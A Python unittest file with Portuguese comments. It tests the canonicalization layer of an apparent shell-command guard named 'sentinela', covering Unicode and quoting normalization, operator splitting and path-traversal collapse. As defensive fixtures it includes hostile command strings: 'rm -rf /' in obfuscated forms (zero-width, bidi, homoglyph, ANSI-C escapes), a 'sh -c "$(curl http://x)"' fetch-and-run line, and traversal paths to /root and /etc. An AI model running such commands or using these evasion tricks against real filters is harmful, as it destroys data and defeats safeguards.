"""Testes da canonicalização — a base de tudo.

Se estes falharem, toda regra acima é contornável.
"""

from __future__ import annotations

import unittest

from sentinela.canonicalize import (
    canonical_path,
    looks_like_path,
    normalize,
    split_segments,
    to_segments,
)


class TestNormalize(unittest.TestCase):
    def test_remove_zero_width(self) -> None:
        self.assertEqual(normalize("r\u200bm -rf /"), "rm -rf /")

    def test_remove_bidi_override(self) -> None:
        self.assertEqual(normalize("rm -\u202erf"), "rm -rf")

    def test_homoglyph_cirillic(self) -> None:
        # "саt" com с e а cirílicos vira "cat" latino
        self.assertEqual(normalize("\u0441\u0430t"), "cat")

    def test_nfkc_fullwidth(self) -> None:
        self.assertEqual(normalize("\uff52\uff4d"), "rm")

    def test_ansi_c_quoting(self) -> None:
        self.assertEqual(normalize("$'\\x72\\x6d' -rf /"), "rm -rf /")

    def test_ansi_c_octal(self) -> None:
        self.assertEqual(normalize("$'\\162\\155'"), "rm")

    def test_plain_text_untouched(self) -> None:
        self.assertEqual(normalize("git status"), "git status")


class TestSplit(unittest.TestCase):
    def test_split_operators(self) -> None:
        self.assertEqual(
            split_segments("a; b && c | d"),
            ["a", "b", "c", "d"],
        )

    def test_respects_single_quotes(self) -> None:
        self.assertEqual(split_segments("echo 'a;b'"), ["echo 'a;b'"])

    def test_respects_double_quotes(self) -> None:
        self.assertEqual(split_segments('echo "a|b"'), ['echo "a|b"'])

    def test_extracts_command_substitution(self) -> None:
        segments = split_segments('sh -c "$(curl http://x)"')
        self.assertTrue(any("curl" in s for s in segments))

    def test_extracts_backticks(self) -> None:
        segments = split_segments("echo `id`")
        self.assertTrue(any(s.strip() == "id" for s in segments))


class TestTokenize(unittest.TestCase):
    def test_unparseable_marks_flag(self) -> None:
        segments = to_segments("echo 'unterminated")
        self.assertFalse(any(s.parseable for s in segments))

    def test_flags_split(self) -> None:
        seg = to_segments("rm -rf /tmp/x")[0]
        self.assertEqual(seg.base, "rm")
        self.assertIn("-rf", seg.argv)


class TestPaths(unittest.TestCase):
    def test_traversal_collapses(self) -> None:
        self.assertEqual(canonical_path("/home/u/../../root/x", "/"), "/root/x")

    def test_percent_decoded(self) -> None:
        self.assertEqual(canonical_path("%2e%2e/etc", "/tmp"), "/etc")

    def test_relative_joins_cwd(self) -> None:
        self.assertEqual(canonical_path("a/../../b", "/x/y"), "/x/b")

    def test_looks_like_path(self) -> None:
        self.assertTrue(looks_like_path("./x"))
        self.assertTrue(looks_like_path("*"))
        self.assertFalse(looks_like_path("--force"))
        self.assertFalse(looks_like_path("status"))


if __name__ == "__main__":
    unittest.main()
